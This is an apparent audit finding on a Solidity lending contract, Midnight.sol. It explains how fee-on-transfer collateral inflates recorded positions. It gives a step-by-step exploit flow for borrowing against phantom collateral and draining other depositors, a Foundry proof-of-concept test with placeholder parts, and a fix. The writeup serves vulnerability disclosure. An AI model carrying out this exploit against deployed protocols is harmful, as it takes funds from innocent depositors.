### Title
Fee-on-Transfer Collateral Token Inflates `position.collateral` Beyond Actual Holdings - (File: src/Midnight.sol)

### Summary

`supplyCollateral` credits `position[id][onBehalf].collateral[collateralIndex]` with the caller-supplied `assets` value before executing the token transfer, with no before/after balance check. When the collateral token silently deducts a transfer fee, the protocol records more collateral than it actually receives. Because `isHealthy` and `withdrawCollateral` both operate on the inflated recorded value rather than the real token balance, the invariant `position.collateral[i] <= collateralToken.balanceOf(address(this))` is broken, enabling borrowing against phantom collateral and eventual protocol insolvency.

### Finding Description

**Exact code path:**

`supplyCollateral` at [1](#0-0) 

Line 533 writes `oldCollateral + assets` into storage unconditionally: [2](#0-1) 

Line 545 then calls `safeTransferFrom`, which for a fee-on-transfer token delivers only `assets * (1 - fee_rate)` to `address(this)`: [3](#0-2) 

There is no balance snapshot before/after the transfer to reconcile the actual received amount.

**Market creation is permissionless.** `touchMarket` validates LLTV tiers, `maxLif`, sorted collateral addresses, and maturity, but imposes **no restriction on the collateral token type**: [4](#0-3) 

Any address can create a market whose `collateralParams[i].token` is a fee-on-transfer ERC20.

**`isHealthy` uses the recorded (inflated) collateral value**, not the actual token balance: [5](#0-4) 

`_position.collateral[i]` is the phantom amount, so `maxDebt` is overstated and the position appears healthy when it is not.

**`withdrawCollateral` transfers the full recorded `assets` out:** [6](#0-5) 

The health check at line 568 passes because it uses the same inflated collateral value. The `safeTransfer` at line 572 sends `assets` tokens out, which can exceed the contract's actual balance of that token when multiple users have supplied the same fee-on-transfer collateral.

**Exploit flow:**

1. Attacker deploys a fee-on-transfer ERC20 (e.g., 1% fee) and creates a valid market with it as collateral (permissionless via `touchMarket`).
2. Attacker calls `supplyCollateral(market, 0, 1e18, attacker)`. Position records `1e18`; contract receives `0.99e18`.
3. Attacker calls `take` (sell side) to borrow against the phantom `1e18` collateral. `isHealthy` passes because it reads `position.collateral[0] = 1e18`.
4. Attacker now holds borrowed loan tokens backed by only `0.99e18` of real collateral.
5. On default/liquidation, the liquidator attempts to seize `1e18` collateral but the contract holds only `0.99e18` (or less if other users also supplied). The `safeTransfer` in `liquidate` either reverts (freezing the liquidation) or drains collateral belonging to other users of the same token.
6. Alternatively, if other users have deposited the same fee-on-transfer token, the attacker can call `withdrawCollateral(market, 0, 1e18, attacker, attacker)` — the health check passes (no debt), and `safeTransfer` sends `1e18` out, consuming `0.01e18` of another user's real collateral.

**No existing check stops this.** The `isHealthy` guard in `withdrawCollateral` is bypassed because it reads the inflated `position.collateral` value. There is no `balanceOf` comparison anywhere in `supplyCollateral` or `withdrawCollateral`.

### Impact Explanation

The core invariant — that the protocol's token balance covers all recorded collateral — is violated. Borrowers can borrow against phantom collateral, making positions appear overcollateralized when they are not. On liquidation or withdrawal, the protocol either reverts (freezing funds) or transfers tokens belonging to other depositors, causing direct loss of funds for innocent users. With repeated calls or multiple users, the discrepancy compounds and the protocol becomes insolvent for that collateral token.

### Likelihood Explanation

Market creation is fully permissionless; any user can deploy a fee-on-transfer token and create a valid market. The attacker needs only to hold the fee-on-transfer token and have it approved. The exploit is repeatable on every `supplyCollateral` call and requires no privileged access, no oracle manipulation, and no governance action. Fee-on-transfer tokens are a well-known ERC20 variant (e.g., tokens with deflationary mechanics or protocol fees).

### Recommendation

Record the contract's token balance before and after the `safeTransferFrom` call in `supplyCollateral`, and credit only the actual received amount to the position:

```solidity
uint256 balanceBefore = ERC20(collateralToken).balanceOf(address(this));
SafeTransferLib.safeTransferFrom(collateralToken, msg.sender, address(this), assets);
uint256 received = ERC20(collateralToken).balanceOf(address(this)) - balanceBefore;
_position.collateral[collateralIndex] = UtilsLib.toUint128(oldCollateral + received);
```

Move the state write after the transfer and use `received` instead of `assets`. Alternatively, explicitly disallow fee-on-transfer tokens via a documentation requirement enforced at market creation (e.g., a balance check in `touchMarket`), though the former is the safer fix.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight} from "src/Midnight.sol";
import {Market, CollateralParams} from "src/interfaces/IMidnight.sol";

contract FeeToken is ERC20 {
    // 1% fee on every transfer
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        uint256 fee = amount / 100;
        super.transferFrom(from, to, amount - fee); // delivers amount*(1-0.01)
        return true;
    }
}

contract FeeOnTransferCollateralTest is Test {
    Midnight midnight;
    FeeToken feeToken;
    Market market;

    function setUp() public {
        midnight = new Midnight(...);
        feeToken = new FeeToken();
        // Build a valid market with feeToken as collateral
        market.collateralParams.push(CollateralParams({
            token: address(feeToken),
            lltv: 0.77e18,
            oracle: address(new MockOracle(1e36)), // price = 1
            maxLif: maxLif(0.77e18, LIQUIDATION_CURSOR_LOW)
        }));
        market.loanToken = address(loanToken);
        market.maturity = block.timestamp + 365 days;
        midnight.touchMarket(market);
    }

    function testPhantomCollateral() public {
        uint256 assets = 1e18;
        feeToken.mint(address(this), assets);
        feeToken.approve(address(midnight), assets);

        bytes32 id = midnight.toId(market);
        uint256 balBefore = feeToken.balanceOf(address(midnight));

        midnight.supplyCollateral(market, 0, assets, address(this));

        uint256 balAfter = feeToken.balanceOf(address(midnight));
        uint256 recorded = midnight.collateral(id, address(this), 0);

        // ASSERTION 1: recorded collateral > actual received
        assertGt(recorded, balAfter - balBefore, "phantom collateral exists");
        // recorded = 1e18, actual received = 0.99e18

        // ASSERTION 2: withdrawCollateral sends more than was deposited
        // (requires another user to have deposited the same token first)
        // midnight.withdrawCollateral(market, 0, assets, address(this), address(this));
        // assertEq(feeToken.balanceOf(address(this)), assets); // succeeds, drains 0.01e18 from others

        // ASSERTION 3: invariant violation
        assertGt(recorded, feeToken.balanceOf(address(midnight)), "invariant broken: position.collateral > contract balance");
    }
}
```

**Expected assertions:** `recorded (1e18) > actual balance (0.99e18)` — the invariant is broken on the first `supplyCollateral` call. A follow-up `withdrawCollateral(assets=1e18)` succeeds (health check passes, no debt) and transfers `1e18` out while the contract only received `0.99e18`, consuming `0.01e18` from other depositors.

### Citations

**File:** src/Midnight.sol (L524-546)
```text
    function supplyCollateral(Market memory market, uint256 collateralIndex, uint256 assets, address onBehalf)
        external
    {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        bytes32 id = touchMarket(market);
        address collateralToken = market.collateralParams[collateralIndex].token;

        Position storage _position = position[id][onBehalf];
        uint256 oldCollateral = _position.collateral[collateralIndex];
        _position.collateral[collateralIndex] = UtilsLib.toUint128(oldCollateral + assets);

        if (oldCollateral == 0 && assets > 0) {
            uint128 newCollateralBitmap = _position.collateralBitmap.setBit(collateralIndex);
            _position.collateralBitmap = newCollateralBitmap;
            require(
                UtilsLib.countBits(newCollateralBitmap) <= MAX_COLLATERALS_PER_BORROWER, TooManyActivatedCollaterals()
            );
        }

        emit EventsLib.SupplyCollateral(msg.sender, id, collateralToken, assets, onBehalf);

        SafeTransferLib.safeTransferFrom(collateralToken, msg.sender, address(this), assets);
    }
```

**File:** src/Midnight.sol (L561-572)
```text
        uint256 newCollateral = _position.collateral[collateralIndex] - assets;
        _position.collateral[collateralIndex] = UtilsLib.toUint128(newCollateral);

        if (newCollateral == 0 && assets > 0) {
            _position.collateralBitmap = _position.collateralBitmap.clearBit(collateralIndex);
        }

        require(isHealthy(market, id, onBehalf), UnhealthyBorrower());

        emit EventsLib.WithdrawCollateral(msg.sender, id, collateralToken, assets, onBehalf, receiver);

        SafeTransferLib.safeTransfer(collateralToken, receiver, assets);
```

**File:** src/Midnight.sol (L755-791)
```text
    function touchMarket(Market memory market) public returns (bytes32) {
        bytes32 id = toId(market);
        if (marketState[id].tickSpacing == 0) {
            require(market.maturity <= block.timestamp + 100 * 365 days, MaturityTooFar());
            require(market.collateralParams.length > 0, NoCollateralParams());
            require(market.collateralParams.length <= MAX_COLLATERALS, TooManyCollateralParams());
            address previousCollateralToken;
            for (uint256 i = 0; i < market.collateralParams.length; i++) {
                address collateralToken = market.collateralParams[i].token;
                require(collateralToken > previousCollateralToken, CollateralParamsNotSorted());
                uint256 lltv = market.collateralParams[i].lltv;
                require(isLltvAllowed(lltv), LltvNotAllowed());
                require(
                    market.collateralParams[i].maxLif == maxLif(lltv, LIQUIDATION_CURSOR_LOW)
                        || market.collateralParams[i].maxLif == maxLif(lltv, LIQUIDATION_CURSOR_HIGH),
                    InvalidMaxLif()
                );
                previousCollateralToken = collateralToken;
            }

            MarketState storage _marketState = marketState[id];
            _marketState.tickSpacing = DEFAULT_TICK_SPACING;
            uint16[7] memory _defaultSettlementFeeCbp = defaultSettlementFeeCbp[market.loanToken];
            _marketState.settlementFeeCbp0 = _defaultSettlementFeeCbp[0];
            _marketState.settlementFeeCbp1 = _defaultSettlementFeeCbp[1];
            _marketState.settlementFeeCbp2 = _defaultSettlementFeeCbp[2];
            _marketState.settlementFeeCbp3 = _defaultSettlementFeeCbp[3];
            _marketState.settlementFeeCbp4 = _defaultSettlementFeeCbp[4];
            _marketState.settlementFeeCbp5 = _defaultSettlementFeeCbp[5];
            _marketState.settlementFeeCbp6 = _defaultSettlementFeeCbp[6];
            _marketState.continuousFee = defaultContinuousFee[market.loanToken];
            IdLib.storeInCode(market, INITIAL_CHAIN_ID);

            emit EventsLib.MarketCreated(market, id);
        }
        return id;
    }
```

**File:** src/Midnight.sol (L944-959)
```text
    function isHealthy(Market memory market, bytes32 id, address borrower) public view returns (bool) {
        Position storage _position = position[id][borrower];
        uint256 debt = _position.debt;
        uint256 maxDebt;
        if (debt > 0) {
            uint128 _collateralBitmap = _position.collateralBitmap;
            while (_collateralBitmap != 0) {
                uint256 i = UtilsLib.msb(_collateralBitmap);
                CollateralParams memory collateralParam = market.collateralParams[i];
                uint256 price = IOracle(collateralParam.oracle).price();
                maxDebt += _position.collateral[i].mulDivDown(price, ORACLE_PRICE_SCALE)
                    .mulDivDown(collateralParam.lltv, WAD);
                _collateralBitmap = _collateralBitmap.clearBit(i);
            }
        }
        return maxDebt >= debt;
```
